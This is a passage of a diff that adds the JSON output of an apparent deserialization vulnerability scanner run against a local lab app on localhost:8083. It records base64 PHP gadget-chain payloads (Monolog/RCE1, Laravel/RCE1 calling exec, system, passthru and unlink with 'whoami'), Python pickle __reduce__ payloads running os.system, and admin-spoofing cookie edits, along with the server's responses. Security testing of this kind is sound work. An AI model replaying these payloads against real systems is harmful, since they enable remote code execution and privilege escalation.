+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda410>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9d10>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda410>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9d10>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9610>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9e50>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9610>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9e50>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cbd50>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca650>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.94) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cbd50>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca650>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb790>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c96d0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb790>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c96d0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb150>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c83d0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb150>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c83d0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca690>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9cd0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca690>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9cd0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb310>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c8050>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.94) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb310>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c8050>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c8590>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9210>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c8590>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9210>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb490>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9690>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6cb490>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9690>\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/restore-prefs",
+      "method": "POST",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Response content differs in a small, localized way despite same status (similarity=0.95) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9e50>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8150>\",\"success\":true}\\n')",
+        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.95) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9e50>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8150>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6c9e50>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8150>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9690>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8a50>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9690>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8a50>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9910>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9710>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9910>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9710>\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/profile",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
